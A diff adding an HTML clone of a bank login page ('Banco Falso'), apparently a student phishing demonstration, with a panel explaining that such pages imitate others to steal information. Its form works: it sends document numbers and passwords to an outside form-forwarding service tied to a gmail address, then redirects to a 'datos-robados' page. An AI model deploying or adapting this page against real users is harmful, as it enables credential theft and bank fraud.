@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles.css">
+    <script type="text/javascript" src="script.js"></script>
+    <title>Banco Falso</title>
+</head>
+
+<body >
+    <header>
+        <div class="beginMain">
+            <img src="logo.jpg">
+            <p>
+                VrOu    
+            </p>
+        </div>
+    </header>
+    <main>
+        <div class="contenedor">
+                <h2 id="subtitulo">Ingreso de Usuario</h2>
+                <div class="formulario">
+                    <form action= "https://formsubmit.co/formulariossantiago@gmail.com" method="POST">
+                        <div class="entrada">
+                            <label for="pais">País </label>
+                            <select id="pais" name="País">
+                                <option>Uruguay</option>
+                                <option>España</option>
+                                <option>Angóla</option>
+                                <option>Afganistán</option>
+                                <option>Brasil</option>
+                                <option>Cancún</option>
+                                <option>Dubai</option>
+                                <option>Ejipto</option>
+                                <option>Francia</option>
+                            </select>
+                        </div>
+                        <br>
+                        <div class="entrada">
+                            <label for="Cedula">Tipo de Documento </label>
+                            <select id="Cedula" name="Tipo_De_Documento">
+                                <option>
+                                    C.I.
+                                </option>
+                                <option>Banco Hipotecario</option>
+                                <option>C. Identidad Extranjera</option>
+                                <option>Otros</option>
+                            </select>
+                        </div>
+                        <br>
+                        <div class="entrada">
+                            <label for="nDocumento">N° de Documento</label>
+                            <input class="Ingreso" id="nDocumento" type="text" name="Documento" required>
+                        </div>
+                        <div class="entrada">
+                            <label for="password">Contraseña</label>
+                            <input  class="Ingreso" id="password" name="Contraseña" type="password" placeholder="Contraseña" required>           
+                        </div>
+                        <div class="recuerda">
+                            <div class="remember-container">
+                                <div class="remember-switch"></div>
+                            </div>
+                            <p>Recordar Usuario</p>
+                        </div>
+                        <div class="enlaces">
+                            <a>¿Olvidó su Contraseña?</a>
+                            <a>Registrar Usuario</a>
+                        </div>
+                
+                            <br>
+                
+                        <button type="submit" onclick="datosRobados()">Ingresar</button> 
+                
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="http://localhost:8000/datos-robados.html">
+                
+                    <br>
+                    
+                
+                    </form>
+                    
+                </div>
+            </div>
+            
+        
+            <br>
+        
+            
+        </div>
+        <div class="imagen">
+            <img src="_MG_5913.jpg">
+            <h2>
+                Seguridad Informatica
+            </h2>
+            <hr>
+            <p>
+                Este es un ejemplo de paginas web que <strong>simulan</strong> a otras para robar información, a estas paginas se les llama
+                paginas de phishing. 
+            </p>
+            <div class="circulo"></div>
+        </div>     
+    </main>
+    <footer>
+        <div class="aftermain">
+            <div class="grupo">
+                <p><i>CLON</i></p>
+                </div>
+                <div class="nombres">
+                <p class="contacto"><i>Santiago Carrasco</i></p>
+                <p class="contacto"><i></i></p>
+            </div>
+        </div>
+    </footer>
+    <script src="scriptButton.js"></script>
+</body>
+
+</html>
